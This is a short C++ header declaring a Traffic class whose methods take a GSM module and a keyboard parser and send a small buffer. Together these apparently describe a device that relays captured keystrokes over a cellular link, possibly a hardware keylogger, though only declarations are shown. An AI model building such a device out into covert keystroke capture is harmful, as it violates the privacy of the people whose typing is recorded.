// ============================================================================
#ifndef TRAFFIC_H
#define TRAFFIC_H
// ============================================================================
#include "./includes/device/gsm/gsm.h"
#include "./includes/device/keyboard/keyboard.h"
// ============================================================================
const uint8_t MAX_BUFFER_SIZE = 10;

class Traffic {
public:
    static void tanalyze(
        SoftwareGSM* gsm_module,
        KeyboardParser* keyboard_prs
    );
    static void send_buffer(
        SoftwareGSM* gsm_module,
        KeyboardParser* keyboard_prs
    );
};
// ============================================================================
#endif /* TRAFFIC_H */
// ============================================================================
